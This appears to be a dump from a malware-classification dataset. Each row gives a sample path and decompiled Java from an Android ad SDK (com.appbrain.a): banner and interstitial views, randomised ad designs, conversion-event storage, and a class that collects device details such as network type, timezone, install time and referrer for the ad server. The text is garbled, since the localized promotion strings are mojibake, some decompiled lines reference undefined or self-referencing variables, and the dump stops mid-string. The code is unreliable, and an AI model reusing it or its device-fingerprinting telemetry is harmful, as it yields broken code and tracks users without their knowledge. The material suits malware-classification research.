cmn.aj.a(eVar,u.a(b2,Math.max(i2,i3),u.a.SIZE));     bVar2.d.setText(bVar.c(jVar.t));     bVar2.d.setVisibility(0);     bVar2.d.setOnClickListener(bmVar);     bVar2.e.setText(bVar.d(jVar.t));     bVar2.e.setVisibility(0);     bVar2.e.setOnClickListener(bmVar);     bVar2.g.setVisibility(0);     bVar2.g.setOnClickListener(bmVar);     bVar2.h.setVisibility(0);   }   private Drawable b(){     if (!this.m) {       return new ColorDrawable(this.l ? -1442840576 : -1426063361);     }     Point a2=cmn.a.a().a(this.j);     Bitmap createBitmap=Bitmap.createBitmap((a2.x / 5) + android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY,(a2.y / 5) + android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY,Bitmap.Config.ARGB_8888);     createBitmap.eraseColor(-13312);     Canvas canvas=new Canvas(createBitmap);     RectF rectF=new RectF((-createBitmap.getWidth()) * 0.5f,(-createBitmap.getHeight()) * 0.5f,createBitmap.getWidth() * 1.5f,createBitmap.getHeight() * 1.5f);     Paint paint=new Paint();     paint.setAntiAlias(true);     paint.setColor(-133694);     int i2=0;     while (true) {       int i3=i2;       if (i3 >= 360) {         return new BitmapDrawable(this.j.getResources(),createBitmap);       }       canvas.drawArc(rectF,i3,6.0f,true,paint);       i2=i3 + 12;     }   }   private c c(){     try {       return (c)a[this.n].newInstance();     }  catch (    IllegalAccessException e2) {       e2.printStackTrace();       return null;     } catch (    InstantiationException e3) {       e3.printStackTrace();       return null;     }   }   public final View a(){     Configuration configuration=this.j.getResources().getConfiguration();     String language=configuration.locale.getLanguage();     boolean z=configuration.orientation == 2;     int i2=this.l ? -16777216 : -1;     c c2=c();     b bVar=new b();     bVar.a=new ProgressBar(this.j);     bVar.b=new TextView(this.j);     bVar.b.setVisibility(8);     cmn.a a2=cmn.a.a();     TextView textView=bVar.b;     float b2=cmn.ab.b(4.0f);     ShapeDrawable shapeDrawable=new ShapeDrawable(new RoundRectShape(new float[]{b2,b2,b2,b2,b2,b2,b2,b2},null,null));     shapeDrawable.getPaint().setColor(-1954001);     a2.a(textView,com.appbrain.d.c.a(this.j,shapeDrawable));     bVar.b.setTextColor(-1);     bVar.b.setText(v.a(1,language).toUpperCase());     bVar.b.setTextSize(16.0f);     bVar.b.setPadding(cmn.ab.b(8.0f),cmn.ab.b(4.0f),cmn.ab.b(8.0f),cmn.ab.b(4.0f));     bVar.b.setTypeface(bVar.b.getTypeface(),1);     bVar.c=new ImageView(this.j);     ImageView imageView=bVar.c;     int i3=this.l ? -4605768 : -1;     int i4=this.l ? -10724517 : -7829368;     int i5=this.l ? -1 : -16777216;     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed},a(i4,i5));     stateListDrawable.addState(new int[0],a(i3,i5));     imageView.setImageDrawable(stateListDrawable);     bVar.c.setOnClickListener(new bk(this));     bVar.d=new TextView(this.j);     bVar.d.setVisibility(8);     bVar.d.setTypeface(bVar.d.getTypeface(),1);     bVar.d.setTextColor(i2);     bVar.d.setTextSize(22.0f);     bVar.f=new e(this.j);     bVar.f.setVisibility(8);     if (c2.a()) {       bVar.f.a();     }     bVar.e=new TextView(this.j);     bVar.e.setVisibility(8);     bVar.e.setTextColor(i2);     bVar.e.setTextSize(16.0f);     if (Build.VERSION.SDK_INT >= 16) {       bVar.e.setTypeface(Typeface.create(""sans-serif-light"",0));     }     bVar.g=new TextView(this.j);     bVar.g.setVisibility(8);     bVar.g.setGravity(16);     bVar.g.setTextColor(-1);     bVar.g.setTypeface(bVar.g.getTypeface(),1);     bVar.g.setTextSize(18.0f);     bVar.g.setText(v.a(3,language).toUpperCase());     bVar.g.setCompoundDrawablePadding(cmn.ab.b(8.0f));     TextView textView2=bVar.g;     a aVar=b[this.o];     if (aVar.b) {       cmn.a.a().a(textView2);     }     Color.colorToHSV(aVar.a,r4);     float[] fArr={0.0f,0.0f,fArr[2] * 0.75f};     int HSVToColor=Color.HSVToColor(fArr);     StateListDrawable stateListDrawable2=new StateListDrawable();     stateListDrawable2.addState(new int[]{R.attr.state_pressed},a(HSVToColor,aVar.b));     stateListDrawable2.addState(new int[0],a(aVar.a,aVar.b));     cmn.a.a().a(textView2,stateListDrawable2);     ShapeDrawable a3=bx.a(-1);     a3.setBounds(0,0,cmn.ab.b(32.0f),cmn.ab.b(32.0f));     bVar.g.setCompoundDrawables(a3,null,null,null);     bVar.g.setPadding(cmn.ab.b(16.0f),cmn.ab.b(12.0f),cmn.ab.b(16.0f),cmn.ab.b(12.0f));     bVar.h=new TextView(this.j);     bVar.h.setVisibility(8);     bVar.h.setTextColor(i2);     bVar.h.setTextSize(11.0f);     bVar.h.setText(v.a(11,language));     ViewGroup b3=z ? c2.b(this.j,bVar) : c2.a(this.j,bVar);     b3.setBackgroundColor(this.l ? -1 : -14540254);     if (Build.VERSION.SDK_INT >= 11) {       LayoutTransition layoutTransition=new LayoutTransition();       layoutTransition.setDuration(200L);       layoutTransition.setStartDelay(2,0L);       layoutTransition.setStartDelay(3,0L);       layoutTransition.setStartDelay(0,0L);       layoutTransition.setStartDelay(1,0L);       b3.setLayoutTransition(layoutTransition);     }     LinearLayout linearLayout=new LinearLayout(this.j);     linearLayout.setOrientation(1);     linearLayout.setGravity(17);     cmn.a.a().a(linearLayout,b());     linearLayout.setPadding(cmn.ab.b(24.0f),0,cmn.ab.b(24.0f),0);     linearLayout.addView(b3);     linearLayout.setClickable(true);     bv.a(this.j,new bl(this,bVar,c2));     return linearLayout;   }   public final void a(  Bundle bundle){     bundle.putInt(e,this.t);     bundle.putBoolean(f,this.l);     bundle.putBoolean(g,this.m);     bundle.putInt(h,this.n);     bundle.putInt(i,this.o);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\k.code","public static class k implements g {   @Override public final int a(){     return bx.c.nextInt(bx.a.length);   }   @Override public final View a(  Context context,  String str,  String str2,  String str3,  String str4,  e eVar,  View.OnClickListener onClickListener){     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(0);     cmn.a.a().a(linearLayout,new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{eVar.a,eVar.b}));     ImageView imageView=new ImageView(context);     imageView.setImageDrawable(new com.appbrain.d.h(context,str3));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(cmn.ab.b(40.0f),cmn.ab.b(40.0f));     layoutParams.gravity=17;     layoutParams.leftMargin=cmn.ab.b(4.0f);     layoutParams.rightMargin=cmn.ab.b(4.0f);     linearLayout.addView(imageView,layoutParams);     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout2.setOrientation(1);     cmn.x xVar=new cmn.x(context);     xVar.setMaxLines(1);     xVar.setText(str);     xVar.setTextSize(0,cmn.ab.a(16.0f));     xVar.setTextColor(eVar.c);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-1,-2);     linearLayout2.addView(xVar,layoutParams2);     cmn.x xVar2=new cmn.x(context);     xVar2.setMaxLines(1);     xVar2.setText(str2);     xVar2.setTextSize(0,cmn.ab.a(13.0f));     xVar2.setTextColor(eVar.c);     linearLayout2.addView(xVar2,layoutParams2);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);     layoutParams3.gravity=19;     layoutParams3.weight=2.0f;     layoutParams3.leftMargin=cmn.ab.b(4.0f);     layoutParams3.rightMargin=cmn.ab.b(4.0f);     layoutParams3.topMargin=cmn.ab.b(2.0f);     layoutParams3.bottomMargin=cmn.ab.b(2.0f);     linearLayout.addView(linearLayout2,layoutParams3);     ImageButton imageButton=new ImageButton(context);     imageButton.setScaleType(ImageView.ScaleType.CENTER_INSIDE);     imageButton.setImageDrawable(bx.a(eVar.g));     com.appbrain.d.a aVar=new com.appbrain.d.a(new RectShape());     aVar.a().setColor(bx.c(eVar.e));     aVar.a().setStrokeWidth(cmn.ab.b(1.0f));     aVar.setShaderFactory(new l(this,eVar));     cmn.a.a().a(imageButton,com.appbrain.d.c.b(context,aVar));     imageButton.setPadding(cmn.ab.b(12.0f),cmn.ab.b(12.0f),cmn.ab.b(12.0f),cmn.ab.b(12.0f));     ViewGroup.LayoutParams layoutParams4=new LinearLayout.LayoutParams(cmn.ab.b(60.0f),-1);     imageButton.setOnClickListener(onClickListener);     linearLayout.addView(imageButton,layoutParams4);     return linearLayout;   } } final class k extends ShapeDrawable.ShaderFactory {   final int a;   final bx.e b;   final bx.j c;   public k(  bx.j jVar,  int i,  bx.e eVar){     this.c=jVar;     this.a=i;     this.b=eVar;   }   @Override public final Shader resize(  int i,  int i2){     return new LinearGradient(0.0f,0.0f,0.0f,this.a,new int[]{this.b.d,this.b.e},(float[])null,Shader.TileMode.CLAMP);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\l.code","final class l extends ShapeDrawable.ShaderFactory {   final bx.e a;   final bx.k b;   public l(  bx.k kVar,  bx.e eVar){     this.b=kVar;     this.a=eVar;   }   @Override public final Shader resize(  int i,  int i2){     return new LinearGradient(0.0f,0.0f,0.0f,cmn.ab.b(50.0f),new int[]{this.a.d,this.a.e},(float[])null,Shader.TileMode.CLAMP);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\m.code","public final class m {   public static final int[] g={6,4,9,8};   public static final int[] h={3,2,7};   private int j;   private AppBrainBanner k;   private String m;   private int r;   private bx.g i=null;   private com.appbrain.d l=null;   private AtomicBoolean n=new AtomicBoolean(false);   public AtomicBoolean a=new AtomicBoolean(false);   public AtomicBoolean b=new AtomicBoolean(false);   private AtomicBoolean o=new AtomicBoolean(false);   private boolean p=false;   private String q=null;   public int c=0;   public int d=0;   public int e=0;   public int f=0;   public m(  AppBrainBanner appBrainBanner){     this.k=appBrainBanner;     if (appBrainBanner.isInEditMode()) {       return;     }     ax.a().a(appBrainBanner.getContext(),true);   }   public static boolean a(  m mVar,  j.b bVar){     bx.g gVar;     int a=bv.a(mVar.k.getContext(),bVar);     if (a < 0) {       return false;     }     j.d f=bVar.m() == 0 ? j.d.f() : bVar.i(a);     bx.g gVar2=mVar.i;     int i=10;     if (gVar2 == null) {       i=mVar.r;       if (i < 0 || i >= 4) {         i=bx.a(!TextUtils.isEmpty(f.h()));       }       gVar=bx.e(i);     }  else {       gVar=gVar2;     }     if (gVar == mVar.i) {       mVar.j=-2;     }  else {       mVar.j=(int)Math.ceil(cmn.ab.a(50.0f));     }     int a2=gVar.a();     long j=f.j();     w.a b=new w.a().b((i * 1000) + 4096 + a2);     if (bx.d(i)) {       b.a(j);     }     mVar.m=bVar.i() + b.toString();     String e=bVar.e(a);     String a3=bVar.a(a);     String a4=u.a(f.h(),mVar.j,u.a.HEIGHT);     if (a4.startsWith(""/"")) {       a4=ax.a().d() + a4;     }     View a5=gVar.a(mVar.k.getContext(),bVar.c(a),bVar.d(a),bVar.b(a),a4,bx.a[a2],new p(mVar,e,bVar,a3,a));     mVar.k.removeAllViews();     mVar.k.addView(a5,new FrameLayout.LayoutParams(-1,mVar.j));     mVar.k.setVisibility(0);     return true;   }   public final int a(){     return this.j;   }   public final void a(  int i){     this.r=i;   }   public final void a(  AttributeSet attributeSet){     this.r=-1;     this.c=-1;     this.d=-1;     this.e=-1;     this.f=-1;     if (attributeSet != null) {       this.r=attributeSet.getAttributeIntValue(""http://schemas.android.com/apk/lib/com.appbrain"",""appDesign"",-1);       this.c=attributeSet.getAttributeIntValue(""http://schemas.android.com/apk/lib/com.appbrain"",""design"",-1);       if (this.c < -1 || this.c >= bx.b.length) {         this.c=0;       }       this.d=attributeSet.getAttributeIntValue(""http://schemas.android.com/apk/lib/com.appbrain"",""colors"",-1);       if (this.d < -1 || this.d >= bx.a.length) {         this.d=0;       }       this.e=attributeSet.getAttributeIntValue(""http://schemas.android.com/apk/lib/com.appbrain"",""title"",-1);       if (this.e < -1 || this.e >= g.length) {         this.e=0;       }       this.f=attributeSet.getAttributeIntValue(""http://schemas.android.com/apk/lib/com.appbrain"",""button"",-1);       if (this.f < -1 || this.f >= h.length) {         this.f=0;       }     }     Random random=new Random();     if (this.c == -1) {       this.c=random.nextInt(bx.b.length);     }     if (this.d == -1) {       this.d=random.nextInt(bx.a.length);     }     if (this.e == -1) {       this.e=random.nextInt(g.length);     }     if (this.f == -1) {       this.f=random.nextInt(h.length);     }   }   public final void a(  com.appbrain.d dVar){     this.l=dVar;   }   public final void b(){     boolean z;     boolean z2=this.i != null || Math.random() < be.a().a(""nbp"",0.05d);     if (this.n.compareAndSet(false,true)) {       boolean andSet=this.a.getAndSet(true);       String language=this.k.getResources().getConfiguration().locale.getLanguage();       if (this.q != null) {         this.q=this.q.substring(0,Math.min(10,this.q.length()));       }       if (z2 && !this.k.isInEditMode()) {         String str=this.q;         boolean z3=this.p;         cmn.e.a(new n(this,new r(this)));         return;       }       if (!andSet) {         bx.c cVar=bx.b[this.c];         bx.e eVar=bx.a[this.d];         String a=v.a(g[this.e],language);         String a2=v.a(h[this.f],language);         int i=(this.c * 16) + this.d + (this.e * android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS)+ (this.f * android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT);         String str2=this.q;         boolean z4=this.p;         this.m=new w.a().b(i).toString();         if (this.k.isInEditMode()) {           z=true;         }  else {           cmn.s a3=cmn.s.a(this.k.getContext());           z=(a3.b != -1 && a3.c >= 5000 && Build.VERSION.SDK_INT >= 7) && Math.random() <= ax.a().a(z4);         }         boolean z5=z || cmn.s.g;         this.k.removeAllViews();         if (z5) {           this.j=(int)Math.ceil(cmn.ab.a(50.0f));           this.k.addView(cVar.a(this.k.getContext(),a,a2,eVar,this.j,new q(this,i,str2)),new FrameLayout.LayoutParams(-1,this.j));           this.k.setVisibility(0);         }  else {           this.k.setVisibility(8);         }         this.b.set(z5);         if (z5 && this.k.hasWindowFocus()) {           c();         }       }       if (this.l != null) {         this.l.a(this.b.get());       }       this.n.set(false);     }   }   public final void c(){     if (!this.o.compareAndSet(false,true) || this.k.isInEditMode()) {       return;     }     w.a(this.k.getContext(),this.m);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\n.code","public final class n implements Runnable {   final com.appbrain.d a;   final m b;   public n(  m mVar,  com.appbrain.d dVar){     this.b=mVar;     this.a=dVar;   }   @Override public final void run(){     AppBrainBanner appBrainBanner;     appBrainBanner=this.b.k;     bv.a(appBrainBanner.getContext(),new o(this));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\o.code","final class o implements cmn.aa {   final n a;   public o(  n nVar){     this.a=nVar;   }   @Override public final void a(  Object obj){     j.b bVar=(j.b)obj;     if (bVar == null || bVar.g() == 0) {       this.a.a.a(false);     }  else {       this.a.a.a(m.a(this.a.b,bVar));     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\p.code","public final class p implements View.OnClickListener {   final String a;   final j.b b;   final String c;   final int d;   final m e;   public p(  m mVar,  String str,  j.b bVar,  String str2,  int i){     this.e=mVar;     this.a=str;     this.b=bVar;     this.c=str2;     this.d=i;   }   @Override public final void onClick(  View view){     AppBrainBanner appBrainBanner;     com.appbrain.d dVar;     com.appbrain.d dVar2;     AppBrainBanner appBrainBanner2;     String str;     appBrainBanner=this.e.k;     ak.a(appBrainBanner.getContext(),this.a);     if (this.b.k()) {       appBrainBanner2=this.e.k;       Context context=appBrainBanner2.getContext();       String str2=this.c;       str=this.e.m;       ak.a(context,str2,str,this.b.f(this.d));     }     dVar=this.e.l;     if (dVar != null) {       try {         dVar2=this.e.l;         dVar2.a();       }  catch (      Throwable th) {         th.printStackTrace();       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\q.code","public final class q implements View.OnClickListener {   final int a;   final String b;   final m c;   public q(  m mVar,  int i,  String str){     this.c=mVar;     this.a=i;     this.b=str;   }   @Override public final void onClick(  View view){     AppBrainBanner appBrainBanner;     com.appbrain.d dVar;     com.appbrain.d dVar2;     appBrainBanner=this.c.k;     a.a(appBrainBanner.getContext(),this.a,this.b);     dVar=this.c.l;     if (dVar != null) {       try {         dVar2=this.c.l;         dVar2.a();       }  catch (      Throwable th) {         th.printStackTrace();       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\r.code","public final class r implements com.appbrain.d {   final m a;   public r(  m mVar){     this.a=mVar;   }   @Override public final void a(){   }   @Override public final void a(  boolean z){     com.appbrain.d dVar;     AtomicBoolean atomicBoolean;     com.appbrain.d dVar2;     AppBrainBanner appBrainBanner;     this.a.b.set(z);     if (z) {       appBrainBanner=this.a.k;       if (appBrainBanner.hasWindowFocus()) {         this.a.c();       }     }     dVar=this.a.l;     if (dVar != null) {       dVar2=this.a.l;       dVar2.a(this.a.b.get());     }     atomicBoolean=this.a.n;     atomicBoolean.set(false);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\s.code","public final class s {   private static Long a=null;   private final Context b;   public s(  Context context){     this.b=context.getApplicationContext();     if (be.a().b()) {       return;     }     be.a().a(context,false);   }   private static long a(  Context context){     if (a == null) {       try {         PackageInfo packageInfo=context.getPackageManager().getPackageInfo(context.getPackageName(),0);         if (packageInfo != null) {           a=Long.valueOf(cmn.a.a().a(packageInfo,packageInfo.applicationInfo));         }  else {           a=0L;         }       }  catch (      Throwable th) {         th.printStackTrace();         a=0L;       }     }     return a.longValue();   }   public final h.a a(){     cmn.s a2=cmn.s.a(this.b);     h.a.C0016a an=h.a.an();     an.a(SystemClock.elapsedRealtime());     an.b(System.currentTimeMillis());     an.a(a2.h());     an.b(a2.l());     an.c(new StringBuilder().append(a2.f()).toString());     an.d(a2.d());     an.e(a2.g());     an.f(a2.j());     an.g(a2.i());     an.a(a2.k());     an.b(a2.e());     an.h(a2.a());     an.i(a2.b());     an.j(a2.c());     an.m(a2.o());     an.k(a2.n());     an.l(a2.m());     an.o(Build.VERSION.SDK_INT);     an.n(TimeZone.getDefault().getOffset(System.currentTimeMillis()));     be a3=be.a();     an.c((a3.e() ? 1000 : 0) + 60);     String a4=ReferrerReceiver.a(a3.h());     if (a4 != null) {       an.n(a4);     }     SharedPreferences d=a3.d();     an.d(d.getInt(""pingcount"",0));     an.e(d.getInt(""init_called"",0));     an.c(a(this.b) / 1000);     an.f(a2.b);     an.g(a2.c);     an.h(a2.d);     try {       NetworkInfo activeNetworkInfo=((ConnectivityManager)this.b.getSystemService(""connectivity"")).getActiveNetworkInfo();       if (activeNetworkInfo == null) {         an.i(1);       }  else {         an.i(activeNetworkInfo.getSubtype() + ((activeNetworkInfo.getType() + 1) * 1000));       }     }  catch (    Exception e) {       an.i(0);     }     an.j(d.getInt(""ow_imp"",0));     an.k(d.getInt(""ow_click"",0));     an.l(d.getInt(""ow_inst"",0));     an.o(a2.e);     an.m(a2.a);     String a5=a3.a(""extra"",(String)null);     if (a5 != null) {       an.p(a5);     }     byte[] b=az.b();     if (b != null) {       an.a(com.appbrain.b.c.a(b));     }     byte[] c=az.c();     if (c != null) {       an.b(com.appbrain.b.c.a(c));     }     an.d(az.a() / 1000);     return an.c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\t.code","public final class t {   private static List a(  Context context){     ArrayList arrayList=new ArrayList();     try {       DataInputStream dataInputStream=new DataInputStream(context.openFileInput(""com.appbrain.conv_events""));       try {         int readInt=dataInputStream.readInt();         for (int i=0; i < readInt; i++) {           byte[] bArr=new byte[dataInputStream.readInt()];           dataInputStream.readFully(bArr);           arrayList.add(a.c.a(bArr));         }       }   finally {         dataInputStream.close();       }     }  catch (    Exception e) {     }     return arrayList;   }   public static void a(  Context context,  a.c cVar){     a.k.C0015a n=a.k.n();     n.a((Iterable)a(context));     if (cVar != null) {       n.a(cVar);     }  else     if (n.f() > 0) {       n.a(true);     }     a.k c=n.c();     try {       a.e a=av.a(context).a(c);       try {         context.deleteFile(""com.appbrain.conv_events"");       }  catch (      Exception e) {       }       try {         an.a(context,a.h());       }  catch (      Throwable th) {         th.printStackTrace();       }     }  catch (    Exception e2) {       List m=c.m();       try {         DataOutputStream dataOutputStream=new DataOutputStream(context.openFileOutput(""com.appbrain.conv_events"",0));         try {           dataOutputStream.writeInt(m.size());           Iterator it=m.iterator();           while (it.hasNext()) {             byte[] b=((a.c)it.next()).b();             dataOutputStream.writeInt(b.length);             dataOutputStream.write(b);           }           throw e2;         }   finally {           dataOutputStream.close();         }       }  catch (      Exception e3) {         throw e2;       }     }   }   public static boolean a(  Context context,  Intent intent){     if (intent == null || !TextUtils.equals(intent.getAction(),""com.appbrain.CONVERSION"")) {       return false;     }     if (be.a().c() || be.a().a(""convoff"",0) != 0) {       return true;     }     String stringExtra=intent.getStringExtra(""com.appbrain.NAME"");     if (stringExtra != null && stringExtra.length() > 20) {       stringExtra=stringExtra.substring(0,20);     }     try {       a(context,a.c.l().a(System.currentTimeMillis()).a(stringExtra).a(intent.getIntExtra(""com.appbrain.VALUE"",0)).c());     }  catch (    Exception e) {       e.printStackTrace();     }     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\u.code","public final class u {   public enum a {  SIZE('s'),   WIDTH('w'),   HEIGHT('h');   private char d;   a(  char c){     this.d=c;   }   public final char a(){     return this.d;   } }   public static String a(  String str,  int i,  a aVar){     Uri parse;     String host;     Uri uri=null;     if (!TextUtils.isEmpty(str) && (host=(parse=Uri.parse(str)).getHost()) != null && host.endsWith(""ggpht.com"")) {       uri=parse;     }     if (uri == null) {       return str;     }     String uri2=uri.buildUpon().path(uri.getPath().replaceFirst(""=s[0-9]+$"","""")).build().toString();     if (i > 1600) {       i=1600;     }     if (i > 0) {       uri2=uri2 + ""="" + aVar.a()+ i;     }     return uri2;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\v.code","public final class v {   private static final String[] a={""Yes!"",""Free"",""More free apps"",""Download"",""Get more great apps for your phone"",""Would you like more free apps?"",""There are some great free apps waiting for you!"",""Download now"",""Download today's free app offers"",""Download the best free apps"",""Not now"",""App promotion by AppBrain"",""Click an app to download it from the Google Play market"",""Thank you for using our app!""};   private static final Map b; static {     HashMap hashMap=new HashMap();     b=hashMap;     hashMap.put(""sk"",new String[]{""Ã�no!"",""Zadarmo"",""Viac bezplatnÃ½ch appiek"",""Stiahni"",""ZÃ­skaj viac skvelÃ½ch appiek pre tvoj mobil"",""Chceli by ste viac bezplatnÃ½ch aplikÃ¡ciÃ­?"",""SkvelÃ© bezplatnÃ© appky, ktorÃ© Ä�akajÃº len na teba!"",""StiahnuÅ¥ teraz"",""Stiahni si bezplatnÃ© appky z dneÅ¡nej ponuky"",""Stiahni si najlepÅ¡ie bezplatnÃ© appky"",""Teraz nie"",null,""Klikni na appku a stiahni si ju z obchodu Google Play"",""ÄŽakujeme, Å¾e pouÅ¾Ã­vate naÅ¡u applikÃ¡ciu!""});     b.put(""zh"",new String[]{""æ˜¯!"",""å…�è´¹"",""æ›´å¤šå…�è´¹åº”ç”¨ç¨‹åº�"",""ä¸‹è½½"",""èŽ·å�–æ›´å¤šå‡ºè‰²çš„æ‰‹æœºåº”ç”¨ç¨‹åº�"",""æƒ³è¦�æ›´å¤šå…�è´¹åº”ç”¨ç¨‹åº�å�—ï¼Ÿ"",""æœ‰ä¸€äº›å‡ºè‰²çš„å…�è´¹åº”ç”¨ç¨‹åº�ç­‰ç�€ä½ ï¼�"",""ç«‹å�³ä¸‹è½½"",""ä¸‹è½½ä»Šå¤©æ��ä¾›çš„å…�è´¹åº”ç”¨ç¨‹åº�"",""ä¸‹è½½æœ€ä½³çš„å…�è´¹åº”ç”¨ç¨‹åº�"",""çŽ°åœ¨ä¸�"",null,""ç‚¹å‡»ä¸€ä¸ªåº”ç”¨ç¨‹åº�ä»¥ä»ŽGoogle Playå¸‚åœºä¸‹è½½"",""æ„Ÿè°¢ä½ ä½¿ç”¨æˆ‘ä»¬çš„åº”ç”¨ç¨‹åº�ï¼�""});     b.put(""it"",new String[]{""SÃ¬!"",""Gratis"",""Altre app gratuite"",""Scarica"",""Scopri altre fantastiche app per il tuo telefono"",""Vorresti altre app gratuite?"",""Ci sono fantastiche app gratuite che ti aspettano!"",""Scarica subito"",""Scarica le offerte di oggi delle app gratuite"",""Scarica le piÃ¹ belle app gratuite"",""Non ora"",null,""Fai clic su un'app per scaricarla dal Google Play market"",""Grazie per aver utilizzato questa app!""});     b.put(""vi"",new String[]{""CÃ³!"",""Miá»…n phÃ­"",""Nhá»¯ng á»©ng dá»¥ng miá»…n phÃ­ khÃ¡c"",""Táº£i xuá»‘ng"",""Táº£i thÃªm nhiá»�u á»©ng dá»¥ng tuyá»‡t vá»�i cho Ä‘iá»‡n thoáº¡i cá»§a báº¡n"",""Báº¡n cÃ³ thÃ­ch thÃªm nhiá»�u á»©ng dá»¥ng miá»…n phÃ­?"",""CÃ³ ráº¥t nhiá»�u á»©ng dá»¥ng miá»…n phÃ­ tuyá»‡t vá»�i Ä‘ang Ä‘á»£i báº¡n!"",""Táº£i ngay"",""Táº£i ngay cÃ¡c á»©ng dá»¥ng tuyá»‡t nháº¥t cho hÃ´m nay"",""Táº£i ngay nhá»¯ng á»©ng dá»¥ng miá»…n phÃ­ tá»‘t nháº¥t"",""LÃºc khÃ¡c"",null,""Báº¥m Ä‘á»ƒ táº£i á»©ng dá»¥ng tá»« chá»£ á»©ng dá»¥ng Google Play"",""CÃ¡m Æ¡n báº¡n Ä‘Ã£ sá»­ dá»¥ng á»©ng dá»¥ng cá»§a chÃºng tÃ´i!""});     b.put(""tr"",new String[]{""Evet!"",""Bedava"",""Bedava uygulamalar"",""Ä°ndir"",""Telefonunuz iÃ§in harika uygulamalar edinin"",""BaÅŸka bedava uygulama ister misiniz?"",""Sizi bekleyen harika uygulamalar var!"",""Åžimdi indirin"",""BugÃ¼ne Ã¶zel bedava uygulamalarÄ± indirin"",""En iyi bedava uygulamalarÄ± indirin"",""Åžimdi deÄŸil"",null,""Google Play pazarÄ±ndan indirmek iÃ§in bir oyunu tÄ±klatÄ±n"",""Uyg. kullandÄ±ÄŸÄ±nÄ±z iÃ§in teÅŸekkÃ¼rler!""});     b.put(""hu"",new String[]{""Igen!"",""Ingyenes"",""MÃ©g tÃ¶bb ingyenes alkalmazÃ¡s"",""LetÃ¶ltÃ©s"",""Szerezz be mÃ©g tÃ¶bb nagyszerÅ± alkalmazÃ¡st a telefondra"",""SzeretnÃ©l mÃ©g tÃ¶bb ingyenes alkalmazÃ¡st?"",""A legjobb ingyenes alkalmazÃ¡sok csak rÃ¡d vÃ¡rnak!"",""TÃ¶ltsd le most"",""TÃ¶ltsd le a nap legjobb ingyenes alkalmazÃ¡sait"",""TÃ¶ltsd le a legjobb ingyenes alkalmazÃ¡sokat"",""Most nem"",null,""Kattints az alkalmazÃ¡sra Ã©s tÃ¶ltsd le a Google Play Ã�ruhÃ¡zbÃ³l!"",""KÃ¶szÃ¶njÃ¼k, hogy az alkalmazÃ¡sunkat hasznÃ¡ltad!""});     b.put(""ko"",new String[]{""ì˜ˆ!"",""ë¬´ë£Œ"",""ë�” ë§Žì�€ ë¬´ë£Œ ì•±"",""ë‹¤ìš´ë¡œë“œ"",""í�°ì—� ë�” ë§Žì�€ ë©‹ì§„ ì•±ì�„ ë°›ìœ¼ì„¸ìš”"",""ë�” ë§Žì�€ ë¬´ë£Œ ì•±ì�„ ì›�í•˜ì‹­ë‹ˆê¹Œ?"",""ë©‹ì§„ ë¬´ë£Œ ì•±ë“¤ì�´ ì—¬ëŸ¬ë¶„ì�„ ê¸°ë‹¤ë¦¬ê³  ìžˆìŠµë‹ˆë‹¤!"",""ì§€ê¸ˆ ë‹¤ìš´ë¡œë“œ"",""ì˜¤ëŠ˜ì�˜ ë¬´ë£Œ ì•± ë‹¤ìš´ë¡œë“œ"",""ìµœê³ ì�˜ ë¬´ë£Œ ì•± ë‹¤ìš´ë¡œë“œ"",""ë‹¤ì�Œì—�"",null,""ì•±ì�„ í�´ë¦­í•˜ì—¬ Google Play ë§ˆì¼“ì—�ì„œ ë‹¤ìš´ë¡œë“œí•˜ì„¸ìš”"",""ì €í�¬ ì•±ì�„ ì�´ìš©í•´ì£¼ì…”ì„œ ê°�ì‚¬í•©ë‹ˆë‹¤!""});     b.put(""ar"",new String[]{""Ù†Ø¹Ù…!\u200f"",""Ù…Ø¬Ø§Ù†ÙŠ"",""Ø§Ù„Ù…Ø²ÙŠØ¯ Ù…Ù† Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠØ©"",""ØªÙ†Ø²ÙŠÙ„"",""Ø§Ø­ØµÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø²ÙŠØ¯ Ù…Ù† 